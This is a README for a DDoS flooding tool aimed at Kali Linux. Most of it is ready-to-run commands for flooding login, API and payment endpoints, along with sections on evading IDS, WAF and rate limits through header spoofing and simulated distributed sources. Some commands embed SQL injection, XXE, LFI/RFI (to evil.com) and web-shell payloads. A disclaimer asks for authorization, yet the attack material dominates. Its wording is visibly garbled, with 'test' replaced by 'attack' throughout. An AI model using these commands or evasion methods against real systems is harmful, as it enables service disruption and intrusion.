# 🐉 DDoS Load Tool - Kali Linux Edition

<div align="center">

![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.7+-3776AB?style=for-the-badge&logo=python&logoColor=white)
![Security](https://img.shields.io/badge/DDoS-Attack-red?style=for-the-badge)

**Professional DDoS Load Tool for Powerfull Attacks**

Optimized for Kali Linux | Penetration attacking | Security Assessments

Developed by **Team Supreme X**

</div>

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Kali Linux Specific Features](#-kali-linux-specific-features)
- [Installation on Kali](#-installation-on-kali)
- [Quick Start for Penattackers](#-quick-start-for-penattackers)
- [DDoS Attack Scenarios](#-ddos-attack-scenarios)
- [Penetration attacking Workflows](#-penetration-attacking-workflows)
- [Integration with Kali Tools](#-integration-with-kali-tools)
- [Advanced Techniques](#-advanced-techniques)
- [Evasion Techniques](#-evasion-techniques)
- [Reporting for Clients](#-reporting-for-clients)
- [Legal Considerations](#-legal-considerations)
- [Troubleshooting on Kali](#-troubleshooting-on-kali)

---

## 🎯 Overview

This DDoS Load Tool is specifically optimized for security professionals using Kali Linux. It's designed for authorized penetration attacking, security assessments, and ddos load stress of web applications during security audits.

### Why Use This on Kali Linux?

- ✅ **Pre-configured Python** - Kali comes with Python pre-installed
- ✅ **Security Focused** - Designed for penetration attacking workflows
- ✅ **Integration Ready** - Works alongside other Kali tools
- ✅ **Lightweight** - Minimal resource usage on Kali
- ✅ **CLI Native** - Perfect for terminal-based workflows
- ✅ **Scriptable** - Easy to integrate into automated attacking

---

## 🔧 Kali Linux Specific Features

### Optimized for DDoS Attack

1. **DoS/DDoS Simulation** - attack application resilience against denial of service
2. **Rate Limiting Bypass attacking** - Verify rate limiting implementations
3. **Session Handling** - attack session management under load
4. **Authentication Stress** - attack auth endpoints for vulnerabilities
5. **Cache Poisoning Detection** - Identify cache-related vulnerabilities
6. **Resource Exhaustion** - attack for resource exhaustion vulnerabilities

### Integration with Kali Workflow

- Works seamlessly with Burp Suite findings
- Complements nmap and nikto scans
- Integrates with Metasploit attacking
- Supports OWASP attacking methodology
- Compatible with security reporting tools

---

## 🚀 Installation on Kali

### Method 1: Quick Install (Recommended)

```bash
# Update system (optional but recommended)
sudo apt update

# Clone repository
cd ~/tools
git clone https://github.com/rudraksha-avatara/ddos-load.git
cd ddos-load

# Install dependencies
pip3 install -r requirements-kali-linux.txt

# Verify installation
python3 main-kali-linux.py --help
```

### Method 2: System-wide Installation

```bash
# Clone to /opt (common for Kali tools)
sudo git clone https://github.com/rudraksha-avatara/ddos-load.git /opt/ddos-load
cd /opt/ddos-load

# Install dependencies
sudo pip3 install -r requirements-kali-linux.txt

# Create symbolic link for easy access
sudo ln -s /opt/ddos-load/main-kali-linux.py /usr/local/bin/loadattack

# Now you can run from anywhere
loadattack --help
```

### Method 3: Virtual Environment (Isolated)

```bash
# Create project directory
mkdir -p ~/penattack/ddos-load
cd ~/penattack/ddos-load

# Clone repository
git clone https://github.com/rudraksha-avatara/ddos-load.git .

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements-kali-linux.txt

# Run tool
python main-kali-linux.py --help
```

### Verify Installation

```bash
# Check Python version (should be 3.7+)
python3 --version

# Check if aiohttp is installed
pip3 list | grep aiohttp

# attack basic functionality
python3 main-kali-linux.py http://attackphp.vulnweb.com -n 10 -c 2
```

### Troubleshooting Installation

```bash
# If pip3 is not found
sudo apt install python3-pip

# If you get permission errors
pip3 install --user -r requirements-kali-linux.txt

# If aiohttp fails to install
sudo apt install python3-dev build-essential
pip3 install aiohttp

# Update pip if needed
pip3 install --upgrade pip
```

---

## ⚡ Quick Start for Penattackers

### Basic Reconnaissance Load attack

```bash
# Light probe (won't trigger most IDS)
python3 main-kali-linux.py http://target.com -n 50 -c 5

# Medium load attack
python3 main-kali-linux.py http://target.com -n 500 -c 25 --no-cache

# Heavy stress attack (with authorization)
python3 main-kali-linux.py http://target.com -n 5000 -c 100 --no-cache --random-ua
```

### attacking Discovered Endpoints

```bash
# After nmap/nikto scan, attack discovered endpoints
python3 main-kali-linux.py http://target.com/admin -n 1000 -c 50 --no-cache

# attack API endpoints
python3 main-kali-linux.py http://target.com/api/v1/users -n 2000 -c 75 --no-cache

# attack login page
python3 main-kali-linux.py http://target.com/login -n 500 -c 30 --no-cache
```

### With Burp Suite Integration

```bash
# attack endpoint found in Burp
python3 main-kali-linux.py http://target.com/vulnerable-endpoint \
  -n 1000 -c 50 \
  -H "Cookie: session=abc123" \
  -H "User-Agent: Mozilla/5.0" \
  --no-cache

# attack POST endpoint from Burp
python3 main-kali-linux.py http://target.com/api/submit \
  -n 500 -c 25 \
  -m POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer token123" \
  --body '{"data":"attack"}' \
  --no-cache
```

---

## 🎯 DDoS Attack Scenarios

### 1. Authentication Bypass attacking

```bash
# attack login endpoint for rate limiting
python3 main-kali-linux.py http://target.com/api/login \
  -n 1000 -c 50 \
  -m POST \
  -H "Content-Type: application/json" \
  --body '{"username":"admin","password":"attack"}' \
  --no-cache

# attack if rate limiting is implemented
python3 main-kali-linux.py http://target.com/api/login \
  -d 60 -c 100 \
  -m POST \
  --body '{"username":"admin","password":"wrong"}' \
  --no-cache
```

### 2. Session Management attacking

```bash
# attack session handling under load
python3 main-kali-linux.py http://target.com/dashboard \
  -n 2000 -c 100 \
  -H "Cookie: PHPSESSID=attack123" \
  --no-cache

# attack session fixation vulnerability
python3 main-kali-linux.py http://target.com/login \
  -n 500 -c 25 \
  -H "Cookie: SESSIONID=fixed_session" \
  --no-cache
```

### 3. API DDoS Attack

```bash
# attack API rate limiting
python3 main-kali-linux.py http://target.com/api/v1/data \
  -n 5000 -c 200 \
  -H "Authorization: Bearer token123" \
  --no-cache

# attack API without authentication
python3 main-kali-linux.py http://target.com/api/v1/users \
  -n 1000 -c 50 \
  --no-cache

# attack API with different methods
python3 main-kali-linux.py http://target.com/api/v1/resource \
  -n 500 -c 25 \
  -m DELETE \
  -H "Authorization: Bearer token123"
```

### 4. DoS Vulnerability Assessment

```bash
# attack application resilience (with authorization)
python3 main-kali-linux.py http://target.com \
  -n 10000 -c 500 \
  --no-cache --random-ua

# attack specific resource-intensive endpoint
python3 main-kali-linux.py http://target.com/search?q=attack \
  -d 300 -c 200 \
  --no-cache

# attack file upload endpoint
python3 main-kali-linux.py http://target.com/upload \
  -n 100 -c 10 \
  -m POST \
  --timeout 120 \
  --no-cache
```

### 5. Cache Poisoning Detection

```bash
# attack cache behavior
python3 main-kali-linux.py http://target.com/page \
  -n 1000 -c 50 \
  -H "X-Forwarded-Host: evil.com" \
  --no-cache

# attack cache with different headers
python3 main-kali-linux.py http://target.com \
  -n 500 -c 25 \
  -H "X-Original-URL: /admin" \
  --random-ua
```

### 6. SQL Injection Under Load

```bash
# attack if SQL injection is exploitable under load
python3 main-kali-linux.py "http://target.com/search?id=1' OR '1'='1" \
  -n 500 -c 25 \
  --no-cache

# attack time-based SQL injection
python3 main-kali-linux.py "http://target.com/user?id=1' AND SLEEP(5)--" \
  -n 100 -c 10 \
  --timeout 60
```

### 7. CSRF Token attacking

```bash
# attack CSRF protection under load
python3 main-kali-linux.py http://target.com/transfer \
  -n 500 -c 25 \
  -m POST \
  -H "Cookie: session=abc123" \
  --body "amount=100&to=attacker" \
  --no-cache
```

### 8. XML/XXE attacking

```bash
# attack XML endpoint under load
python3 main-kali-linux.py http://target.com/api/xml \
  -n 500 -c 25 \
  -m POST \
  -H "Content-Type: application/xml" \
  --body '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>' \
  --no-cache
```

### 9. File Inclusion attacking

```bash
# attack LFI under load
python3 main-kali-linux.py "http://target.com/page?file=../../../../etc/passwd" \
  -n 500 -c 25 \
  --no-cache

# attack RFI
python3 main-kali-linux.py "http://target.com/page?file=http://evil.com/shell.txt" \
  -n 200 -c 10 \
  --no-cache
```

### 10. Business Logic attacking

```bash
# attack race condition in payment
python3 main-kali-linux.py http://target.com/api/purchase \
  -n 100 -c 50 \
  -m POST \
  -H "Authorization: Bearer token123" \
  --body '{"item_id":123,"quantity":1}' \
  --no-cache

# attack concurrent transactions
python3 main-kali-linux.py http://target.com/api/transfer \
  -n 50 -c 25 \
  -m POST \
  --body '{"from":"user1","to":"user2","amount":100}' \
  --no-cache
```

---

## 🔬 Penetration attacking Workflows

### Complete Web Application Assessment

```bash
# Phase 1: Reconnaissance (Light touch)
echo "Phase 1: Reconnaissance"
python3 main-kali-linux.py http://target.com -n 50 -c 5

# Phase 2: Endpoint Discovery attacking
echo "Phase 2: attacking discovered endpoints"
python3 main-kali-linux.py http://target.com/admin -n 100 -c 10 --no-cache
python3 main-kali-linux.py http://target.com/api -n 100 -c 10 --no-cache

# Phase 3: Authentication attacking
echo "Phase 3: Authentication stress attack"
python3 main-kali-linux.py http://target.com/login \
  -n 500 -c 25 -m POST \
  --body '{"user":"admin","pass":"attack"}' \
  --no-cache

# Phase 4: Session Management
echo "Phase 4: Session handling attack"
python3 main-kali-linux.py http://target.com/dashboard \
  -n 1000 -c 50 \
  -H "Cookie: session=attack123" \
  --no-cache

# Phase 5: API Security
echo "Phase 5: API stress attack"
python3 main-kali-linux.py http://target.com/api/v1/users \
  -n 2000 -c 100 \
  -H "Authorization: Bearer token" \
  --no-cache

# Phase 6: DoS Resilience (with authorization)
echo "Phase 6: DoS resilience attack"
python3 main-kali-linux.py http://target.com \
  -n 5000 -c 200 \
  --no-cache --random-ua
```

### Automated attacking Script

Create a file `penattack_load.sh`:

```bash
#!/bin/bash

TARGET="$1"
OUTPUT_DIR="results_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ]; then
    echo "Usage: ./penattack_load.sh <target_url>"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[*] Starting load attacking assessment for $TARGET"
echo "[*] Results will be saved to $OUTPUT_DIR"

# attack 1: Baseline
echo "[+] attack 1: Baseline performance"
python3 main-kali-linux.py "$TARGET" -n 100 -c 10 > "$OUTPUT_DIR/01_baseline.txt"

# attack 2: Moderate load
echo "[+] attack 2: Moderate load"
python3 main-kali-linux.py "$TARGET" -n 1000 -c 50 --no-cache > "$OUTPUT_DIR/02_moderate.txt"

# attack 3: Heavy load
echo "[+] attack 3: Heavy load"
python3 main-kali-linux.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua > "$OUTPUT_DIR/03_heavy.txt"

# attack 4: Stress attack
echo "[+] attack 4: Stress attack"
python3 main-kali-linux.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua > "$OUTPUT_DIR/04_stress.txt"

# attack 5: Duration attack
echo "[+] attack 5: Duration attack (60 seconds)"
python3 main-kali-linux.py "$TARGET" -d 60 -c 100 --no-cache > "$OUTPUT_DIR/05_duration.txt"

echo "[*] attacking complete! Results saved to $OUTPUT_DIR"
echo "[*] Summary:"
grep "Requests per second" "$OUTPUT_DIR"/*.txt
```

Make it executable:
```bash
chmod +x penattack_load.sh
./penattack_load.sh http://target.com
```

---

## 🔗 Integration with Kali Tools

### With Nmap

```bash
# First, scan with nmap
nmap -sV -p 80,443,8080 target.com

# Then attack discovered web services
python3 main-kali-linux.py http://target.com:8080 -n 1000 -c 50 --no-cache
```

### With Nikto

```bash
# Run nikto scan
nikto -h http://target.com -o nikto_results.txt

# attack endpoints found by nikto
python3 main-kali-linux.py http://target.com/admin -n 500 -c 25 --no-cache
python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
```

### With Burp Suite

```bash
# Export request from Burp Suite, then attack it
python3 main-kali-linux.py http://target.com/api/endpoint \
  -n 1000 -c 50 \
  -m POST \
  -H "Cookie: session=from_burp" \
  -H "Content-Type: application/json" \
  --body '{"param":"value"}' \
  --no-cache
```

### With SQLMap

```bash
# First find SQL injection with sqlmap
sqlmap -u "http://target.com/page?id=1" --batch

# Then attack the vulnerable endpoint under load
python3 main-kali-linux.py "http://target.com/page?id=1" \
  -n 500 -c 25 --no-cache
```

### With Metasploit

```bash
# After exploiting with Metasploit, attack the backdoor
python3 main-kali-linux.py http://target.com/shell.php \
  -n 100 -c 10 \
  -m POST \
  --body "cmd=whoami"
```

### With OWASP ZAP

```bash
# After ZAP spider, attack discovered endpoints
python3 main-kali-linux.py http://target.com/api/users -n 1000 -c 50 --no-cache
python3 main-kali-linux.py http://target.com/admin/panel -n 500 -c 25 --no-cache
```

### With Gobuster/Dirb

```bash
# After directory brute force
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# attack found directories
python3 main-kali-linux.py http://target.com/admin -n 500 -c 25 --no-cache
python3 main-kali-linux.py http://target.com/backup -n 500 -c 25 --no-cache
```

### With WPScan (WordPress)

```bash
# Scan WordPress site
wpscan --url http://target.com

# attack WordPress endpoints
python3 main-kali-linux.py http://target.com/wp-login.php \
  -n 500 -c 25 -m POST \
  --body "log=admin&pwd=attack" \
  --no-cache

python3 main-kali-linux.py http://target.com/wp-json/wp/v2/users \
  -n 1000 -c 50 --no-cache
```

### Combined Workflow Example

```bash
#!/bin/bash
# complete_assessment.sh

TARGET="$1"

echo "[*] Phase 1: Port Scanning"
nmap -sV -p- "$TARGET" -oN nmap_results.txt

echo "[*] Phase 2: Web Vulnerability Scanning"
nikto -h "http://$TARGET" -o nikto_results.txt

echo "[*] Phase 3: Directory Enumeration"
gobuster dir -u "http://$TARGET" -w /usr/share/wordlists/dirb/common.txt -o gobuster_results.txt

echo "[*] Phase 4: Load attacking Main Site"
python3 main-kali-linux.py "http://$TARGET" -n 1000 -c 50 --no-cache > load_main.txt

echo "[*] Phase 5: Load attacking Admin Panel"
python3 main-kali-linux.py "http://$TARGET/admin" -n 500 -c 25 --no-cache > load_admin.txt

echo "[*] Phase 6: API Stress attack"
python3 main-kali-linux.py "http://$TARGET/api" -n 2000 -c 100 --no-cache > load_api.txt

echo "[*] Assessment complete!"
```

---

## 🥷 Advanced Techniques

### 1. Stealth attacking (Low and Slow)

```bash
# Very slow, under the radar
python3 main-kali-linux.py http://target.com \
  -n 100 -c 2 \
  --rate-limit 5 \
  --random-ua

# Gradual increase
python3 main-kali-linux.py http://target.com \
  -d 300 -c 10 \
  --rate-limit 10 \
  --random-ua
```

### 2. Distributed attacking Simulation

```bash
# Simulate distributed attack from single machine
# Terminal 1
python3 main-kali-linux.py http://target.com -d 60 -c 50 --random-ua &

# Terminal 2
python3 main-kali-linux.py http://target.com -d 60 -c 50 --random-ua &

# Terminal 3
python3 main-kali-linux.py http://target.com -d 60 -c 50 --random-ua &

# Wait for all to complete
wait
```

### 3. Custom User-Agent attacking

```bash
# attack with specific user agent
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 50 \
  -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)" \
  --no-cache

# attack with mobile user agent
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 50 \
  -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)" \
  --no-cache
```

### 4. Header Injection attacking

```bash
# attack X-Forwarded-For bypass
python3 main-kali-linux.py http://target.com \
  -n 500 -c 25 \
  -H "X-Forwarded-For: 127.0.0.1" \
  --no-cache

# attack Host header injection
python3 main-kali-linux.py http://target.com \
  -n 500 -c 25 \
  -H "Host: evil.com" \
  --no-cache

# attack multiple headers
python3 main-kali-linux.py http://target.com \
  -n 500 -c 25 \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  --no-cache
```

### 5. Protocol attacking

```bash
# attack HTTP/1.1
python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache

# attack HTTPS with various ciphers
python3 main-kali-linux.py https://target.com -n 1000 -c 50 --no-cache

# attack with self-signed cert
python3 main-kali-linux.py https://target.com -n 1000 -c 50 --no-verify-ssl
```

### 6. Timing Attack attacking

```bash
# attack response time variations
python3 main-kali-linux.py http://target.com/login \
  -n 100 -c 1 \
  -m POST \
  --body '{"username":"admin","password":"attack"}' \
  --no-cache

# Compare with wrong username
python3 main-kali-linux.py http://target.com/login \
  -n 100 -c 1 \
  -m POST \
  --body '{"username":"wronguser","password":"attack"}' \
  --no-cache
```

### 7. Resource Exhaustion attacking

```bash
# attack memory exhaustion
python3 main-kali-linux.py http://target.com/large-response \
  -n 1000 -c 100 \
  --no-cache

# attack connection exhaustion
python3 main-kali-linux.py http://target.com \
  -d 300 -c 500 \
  --no-keep-alive \
  --no-cache

# attack bandwidth exhaustion
python3 main-kali-linux.py http://target.com/download/large-file \
  -n 100 -c 50 \
  --timeout 300
```

### 8. Bypass WAF/IDS attacking

```bash
# Slow requests to avoid detection
python3 main-kali-linux.py http://target.com \
  -n 500 -c 10 \
  --rate-limit 20 \
  --random-ua \
  --no-cache

# Vary user agents
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 50 \
  --random-ua \
  --no-cache

# Add legitimate-looking headers
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 50 \
  -H "Referer: https://google.com" \
  -H "Accept-Language: en-US,en;q=0.9" \
  --random-ua \
  --no-cache
```

### 9. API Fuzzing Under Load

```bash
# attack API with various payloads
python3 main-kali-linux.py http://target.com/api/user/1 -n 100 -c 10 --no-cache
python3 main-kali-linux.py http://target.com/api/user/-1 -n 100 -c 10 --no-cache
python3 main-kali-linux.py http://target.com/api/user/999999 -n 100 -c 10 --no-cache
python3 main-kali-linux.py "http://target.com/api/user/1' OR '1'='1" -n 100 -c 10 --no-cache
```

### 10. Multi-Stage Attack Simulation

```bash
#!/bin/bash
# multi_stage_attack.sh

TARGET="$1"

echo "[*] Stage 1: Reconnaissance (Stealth)"
python3 main-kali-linux.py "$TARGET" -n 50 -c 2 --rate-limit 5 --random-ua

sleep 10

echo "[*] Stage 2: Probing (Light)"
python3 main-kali-linux.py "$TARGET" -n 200 -c 10 --random-ua --no-cache

sleep 10

echo "[*] Stage 3: Exploitation Attempt (Moderate)"
python3 main-kali-linux.py "$TARGET/admin" -n 500 -c 25 --random-ua --no-cache

sleep 10

echo "[*] Stage 4: Full Attack (Heavy)"
python3 main-kali-linux.py "$TARGET" -n 5000 -c 200 --random-ua --no-cache

echo "[*] Multi-stage attack complete"
```

---

## 🎭 Evasion Techniques

### 1. IDS/IPS Evasion

```bash
# Low rate to avoid threshold detection
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 10 \
  --rate-limit 50 \
  --random-ua

# Randomize timing
for i in {1..10}; do
    python3 main-kali-linux.py http://target.com -n 100 -c 5 --random-ua
    sleep $((RANDOM % 30 + 10))
done
```

### 2. Rate Limit Bypass

```bash
# attack with X-Forwarded-For rotation
python3 main-kali-linux.py http://target.com/api \
  -n 1000 -c 50 \
  -H "X-Forwarded-For: 1.2.3.4" \
  --no-cache

# attack with different IPs
for ip in 1.1.1.1 8.8.8.8 9.9.9.9; do
    python3 main-kali-linux.py http://target.com/api \
      -n 500 -c 25 \
      -H "X-Forwarded-For: $ip" \
      --no-cache
done
```

### 3. WAF Bypass Techniques

```bash
# Use legitimate user agents
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 50 \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "Referer: https://www.google.com/" \
  -H "Accept: text/html,application/xhtml+xml" \
  --no-cache

# Slow and steady
python3 main-kali-linux.py http://target.com \
  -d 600 -c 20 \
  --rate-limit 30 \
  --random-ua
```

### 4. Fingerprint Obfuscation

```bash
# Rotate user agents
python3 main-kali-linux.py http://target.com \
  -n 2000 -c 100 \
  --random-ua \
  --no-cache

# Add realistic headers
python3 main-kali-linux.py http://target.com \
  -n 1000 -c 50 \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "DNT: 1" \
  -H "Connection: keep-alive" \
  -H "Upgrade-Insecure-Requests: 1" \
  --random-ua \
  --no-cache
```

### 5. Distributed Source Simulation

```bash
#!/bin/bash
# simulate_distributed.sh

TARGET="$1"
DURATION=60

# Simulate multiple sources
python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 1.1.1.1" --random-ua &
python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 8.8.8.8" --random-ua &
python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 9.9.9.9" --random-ua &
python3 main-kali-linux.py "$TARGET" -d $DURATION -c 20 -H "X-Forwarded-For: 4.4.4.4" --random-ua &

wait
echo "[*] Distributed simulation complete"
```

---

## 📊 Reporting for Clients

### Generate Professional Reports

```bash
# Create report directory
mkdir -p reports/$(date +%Y%m%d)

# Run attacks and save results
python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache \
  > reports/$(date +%Y%m%d)/baseline_attack.txt

python3 main-kali-linux.py http://target.com -n 5000 -c 100 --no-cache \
  > reports/$(date +%Y%m%d)/moderate_load.txt

python3 main-kali-linux.py http://target.com -n 10000 -c 200 --no-cache \
  > reports/$(date +%Y%m%d)/heavy_load.txt

python3 main-kali-linux.py http://target.com -d 300 -c 150 --no-cache \
  > reports/$(date +%Y%m%d)/sustained_load.txt
```

### Automated Report Generation Script

Create `generate_report.sh`:

```bash
#!/bin/bash

TARGET="$1"
CLIENT_NAME="$2"
REPORT_DIR="report_${CLIENT_NAME}_$(date +%Y%m%d_%H%M%S)"

if [ -z "$TARGET" ] || [ -z "$CLIENT_NAME" ]; then
    echo "Usage: ./generate_report.sh <target_url> <client_name>"
    exit 1
fi

mkdir -p "$REPORT_DIR"

cat > "$REPORT_DIR/report.txt" << EOF
================================================================================
LOAD attackING SECURITY ASSESSMENT REPORT
================================================================================

Client: $CLIENT_NAME
Target: $TARGET
Date: $(date +"%Y-%m-%d %H:%M:%S")
attacker: $(whoami)
Tool: Advanced DDoS Load Tool v1.0

================================================================================
EXECUTIVE SUMMARY
================================================================================

This report contains the results of load attacking and DoS resilience assessment
performed on $TARGET as part of the security assessment engagement.

================================================================================
attack RESULTS
================================================================================

EOF

echo "[*] Running attack 1: Baseline Performance"
echo "attack 1: Baseline Performance (100 requests, 10 concurrent)" >> "$REPORT_DIR/report.txt"
echo "---" >> "$REPORT_DIR/report.txt"
python3 main-kali-linux.py "$TARGET" -n 100 -c 10 >> "$REPORT_DIR/report.txt" 2>&1
echo "" >> "$REPORT_DIR/report.txt"

echo "[*] Running attack 2: Moderate Load"
echo "attack 2: Moderate Load (1000 requests, 50 concurrent)" >> "$REPORT_DIR/report.txt"
echo "---" >> "$REPORT_DIR/report.txt"
python3 main-kali-linux.py "$TARGET" -n 1000 -c 50 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
echo "" >> "$REPORT_DIR/report.txt"

echo "[*] Running attack 3: Heavy Load"
echo "attack 3: Heavy Load (5000 requests, 100 concurrent)" >> "$REPORT_DIR/report.txt"
echo "---" >> "$REPORT_DIR/report.txt"
python3 main-kali-linux.py "$TARGET" -n 5000 -c 100 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
echo "" >> "$REPORT_DIR/report.txt"

echo "[*] Running attack 4: Stress attack"
echo "attack 4: Stress attack (10000 requests, 200 concurrent)" >> "$REPORT_DIR/report.txt"
echo "---" >> "$REPORT_DIR/report.txt"
python3 main-kali-linux.py "$TARGET" -n 10000 -c 200 --no-cache --random-ua >> "$REPORT_DIR/report.txt" 2>&1
echo "" >> "$REPORT_DIR/report.txt"

echo "[*] Running attack 5: Sustained Load"
echo "attack 5: Sustained Load (60 seconds, 100 concurrent)" >> "$REPORT_DIR/report.txt"
echo "---" >> "$REPORT_DIR/report.txt"
python3 main-kali-linux.py "$TARGET" -d 60 -c 100 --no-cache >> "$REPORT_DIR/report.txt" 2>&1
echo "" >> "$REPORT_DIR/report.txt"

cat >> "$REPORT_DIR/report.txt" << EOF

================================================================================
FINDINGS AND RECOMMENDATIONS
================================================================================

[Add your findings here based on the attack results]

1. Performance Analysis:
   - Review the requests per second metrics
   - Analyze response time percentiles
   - Check success rates under load

2. Security Observations:
   - Rate limiting implementation
   - DoS resilience
   - Error handling under stress

3. Recommendations:
   - [Add specific recommendations]

================================================================================
CONCLUSION
================================================================================

[Add conclusion based on attack results]

================================================================================
END OF REPORT
================================================================================
EOF

echo "[*] Report generated: $REPORT_DIR/report.txt"
echo "[*] Creating summary..."

# Extract key metrics
grep "Requests per second" "$REPORT_DIR/report.txt" > "$REPORT_DIR/summary.txt"
grep "Success Rate" "$REPORT_DIR/report.txt" >> "$REPORT_DIR/summary.txt"

echo "[*] Summary saved: $REPORT_DIR/summary.txt"
echo "[*] Assessment complete!"
```

Make it executable:
```bash
chmod +x generate_report.sh
./generate_report.sh http://target.com "Acme Corporation"
```

### Quick Summary Extraction

```bash
# Extract key metrics from attack results
grep -E "Requests per second|Success Rate|Average:" attack_results.txt

# Create CSV for spreadsheet
echo "attack,Requests,Concurrency,RPS,Success_Rate,Avg_Response" > results.csv
grep "Requests per second" *.txt | awk '{print $NF}' >> results.csv
```

---

## ⚖️ Legal Considerations

### ⚠️ CRITICAL: READ BEFORE USING

**This tool can cause service disruption and may be considered an attack if used without authorization.**

### Legal Requirements for Penetration attacking

#### ✅ You MUST Have:

1. **Written Authorization**
   - Signed contract or letter of authorization
   - Clearly defined scope of attacking
   - Specific IP addresses/domains authorized
   - Time windows for attacking
   - Emergency contact information

2. **Proper Documentation**
   - Keep all authorization documents
   - Document all attacking activities
   - Record timestamps of attacks
   - Save all attack results

3. **Client Notification**
   - Inform client before attacking
   - Notify of any critical findings immediately
   - Provide regular status updates
   - Deliver final report with recommendations

#### ❌ NEVER:

- attack systems without explicit written permission
- Exceed the authorized scope
- attack outside agreed time windows
- Cause intentional damage or data loss
- Access or exfiltrate sensitive data
- attack production systems without approval
- Share findings with unauthorized parties

### Legal Frameworks

#### United States
- **Computer Fraud and Abuse Act (CFAA)** - 18 U.S.C. § 1030
- Unauthorized access is a federal crime
- Penalties: Up to 10 years imprisonment + fines

#### European Union
- **Directive 2013/40/EU** - Attacks against information systems
- Member states have specific cybercrime laws
- Penalties vary by country

#### United Kingdom
- **Computer Misuse Act 1990**
- Unauthorized access: Up to 2 years imprisonment
- Unauthorized modification: Up to 10 years imprisonment

#### International
- Most countries have cybercrime laws
- Unauthorized attacking may violate multiple jurisdictions
- Always check local laws before attacking

### Penetration attacking Agreement Template

```
PENETRATION attackING AUTHORIZATION

Client: [Client Name]
attacker: [Your Name/Company]
Date: [Date]

SCOPE OF attackING:
- Target Systems: [List specific URLs/IPs]
- attacking Period: [Start Date/Time] to [End Date/Time]
- attacking Types: Load attacking, DoS Resilience Assessment
- Excluded Systems: [List any exclusions]

AUTHORIZATION:
I, [Client Representative Name], [Title], hereby authorize [attacker Name]
to perform penetration attacking activities on the systems listed above
during the specified time period.

Client Signature: _________________ Date: _________
attacker Signature: _________________ Date: _________

Emergency Contact: [Phone/Email]
```

### Best Practices for Legal Compliance

1. **Always Get Written Authorization**
   ```bash
   # Before running ANY attack, verify you have authorization
   # Keep authorization documents in project folder
   mkdir -p ~/penattack/client_name/authorization
   ```

2. **Document Everything**
   ```bash
   # Log all commands
   script -a penattack_log_$(date +%Y%m%d).txt
   
   # Run your attacks
   python3 main-kali-linux.py http://target.com -n 1000 -c 50 --no-cache
   
   # Exit logging
   exit
   ```

3. **Stay Within Scope**
   ```bash
   # Only attack authorized targets
   AUTHORIZED_TARGET="http://client-authorized-domain.com"
   python3 main-kali-linux.py "$AUTHORIZED_TARGET" -n 1000 -c 50 --no-cache
   ```

4. **Respect Time Windows**
   ```bash
   # Check current time before attacking
   date
   
   # Only proceed if within authorized window
   ```

5. **Report Findings Responsibly**
   - Report critical vulnerabilities immediately
   - Use secure channels for communication
   - Don't disclose to third parties
   - Follow responsible disclosure practices

### Ethical Hacking Code of Conduct

1. **Integrity**: Always act with honesty and integrity
2. **Confidentiality**: Protect client information
3. **Competence**: Only perform attacks you're qualified for
4. **Legality**: Always operate within the law
5. **Responsibility**: Take responsibility for your actions
6. **Professionalism**: Maintain professional standards

### If You Discover a Vulnerability

1. **Stop attacking** if you find critical vulnerability
2. **Document** the finding with screenshots/logs
3. **Notify Client** immediately through secure channel
4. **Don't Exploit** beyond proof of concept
5. **Provide Remediation** recommendations
6. **Reattack** after fixes are applied (if authorized)

### Disclaimer

By using this tool, you acknowledge that:

- You have read and understood these legal considerations
- You will only use this tool on systems you're authorized to attack
- You accept full legal responsibility for your actions
- The tool developers are not liable for any misuse
- Unauthorized use may result in criminal prosecution

---

## 🔧 Troubleshooting on Kali

### Common Kali-Specific Issues

#### 1. Python Version Issues

```bash
# Check Python version
python3 --version

# If Python 3.7+ not available, update
sudo apt update
sudo apt install python3.9

# Use specific Python version
python3.9 main-kali-linux.py http://target.com -n 100 -c 10
```

#### 2. Permission Errors

```bash
# If you get permission denied
chmod +x main-kali-linux.py

# If pip install fails
pip3 install --user -r requirements-kali-linux.txt

# Or use sudo (not recommended for pip)
sudo pip3 install -r requirements-kali-linux.txt
```

#### 3. Network Issues

```bash
# Check network connectivity
ping target.com

# Check if target is reachable
curl -I http://target.com

# attack with minimal load first
python3 main-kali-linux.py http://target.com -n 10 -c 1
```

#### 4. Too Many Open Files

```bash
# Check current limit
ulimit -n

# Increase limit temporarily
ulimit -n 10000

# Make permanent (add to ~/.bashrc)
echo "ulimit -n 10000" >> ~/.bashrc
source ~/.bashrc

# System-wide limit (requires root)
